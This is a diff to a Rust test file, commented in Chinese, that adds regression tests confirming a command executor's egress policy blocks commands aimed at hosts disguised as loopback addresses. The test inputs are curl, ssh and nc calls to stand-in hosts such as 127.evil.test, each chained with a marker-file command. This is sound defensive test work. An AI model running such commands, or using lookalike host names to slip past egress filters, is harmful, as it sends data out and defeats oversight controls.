@@ -137,6 +137,64 @@ async fn denied_command_never_runs_and_lands_in_the_command_log() {
     assert!(stderr.contains("出口策略"), "拒绝原因须落库：{rows:?}");
 }
 
+/// 决策 246 三条回归的共用断言：默认配置下被拒、命令未执行、`kanban_node_commands` 落了带拒绝原因的行。
+///
+/// `marker` 若出现 = 命令真被执行过——拒绝必须早于 `spawn_in_own_process_group`（决策 179④）。
+async fn assert_disguised_loopback_denied(command: &str, disguise: &str) {
+    let f = fixture(NetworkPolicy::default()).await;
+    let marker = f.worktree.join("EXFILTRATED.txt");
+
+    let err = f
+        .executor
+        .execute(&call(command), &f.ctx)
+        .await
+        .unwrap_err();
+    let Error::PolicyDenied(msg) = &err else {
+        panic!("期望 PolicyDenied，实得 {err:?}");
+    };
+    assert!(msg.contains(disguise), "可归因到伪装主机：{msg}");
+    assert!(!marker.exists(), "被拒的命令不得有任何副作用：{command}");
+
+    let rows = f.store.list_commands("t1", None, None).await.unwrap();
+    assert_eq!(rows.len(), 1, "被拒的调用也要留一行：{rows:?}");
+    let stderr = rows[0].stderr_preview.clone().unwrap_or_default();
+    assert!(stderr.contains("出口策略"), "拒绝原因须落库：{rows:?}");
+    assert!(
+        rows[0].command.contains(disguise),
+        "命令原文须落库：{rows:?}"
+    );
+}
+
+/// ① `url_host` 路径：`curl` 的 URL 字面量里的 `127.` 前缀伪装。
+#[tokio::test]
+async fn curl_disguised_loopback_is_denied_before_execution() {
+    assert_disguised_loopback_denied(
+        "curl http://127.evil.test/x; touch EXFILTRATED.txt",
+        "127.evil.test",
+    )
+    .await;
+}
+
+/// ② `ssh_style_host` 的 `user@host` 形态：`ssh` 目标里的前缀伪装。
+#[tokio::test]
+async fn ssh_disguised_loopback_is_denied_before_execution() {
+    assert_disguised_loopback_denied(
+        "ssh user@127.0.0.1.evil.test true; touch EXFILTRATED.txt",
+        "127.0.0.1.evil.test",
+    )
+    .await;
+}
+
+/// ③ 单目标二进制路径：`nc` 的第一个非选项 token 里的前缀伪装。
+#[tokio::test]
+async fn nc_disguised_loopback_is_denied_before_execution() {
+    assert_disguised_loopback_denied(
+        "nc 127.evil.test 80; touch EXFILTRATED.txt",
+        "127.evil.test",
+    )
+    .await;
+}
+
 /// 放行清单里的目标照常执行（策略不是「一律拒绝」）。
 #[tokio::test]
 async fn allowed_host_runs_the_command() {
